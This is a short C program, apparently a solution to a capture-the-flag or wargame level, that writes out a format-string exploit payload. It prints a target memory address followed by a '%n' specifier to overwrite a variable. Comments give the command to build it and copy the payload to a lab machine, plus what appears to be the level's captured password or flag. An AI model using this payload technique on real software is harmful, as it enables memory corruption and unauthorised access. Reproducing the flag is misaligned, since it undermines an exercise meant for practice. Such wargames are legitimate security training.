#include <unistd.h>

//gcc script.c && ./a.out > payload && scp -P 4242 payload level4@192.168.56.102:/tmp/payload4
//b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

int main() {
    int m_address = 0x8049810;
    write(1, &m_address, 4);
    write(1, "%16930112c%12$n\n", 16); //16930116 (expected value of m) - 4 (size of address)
}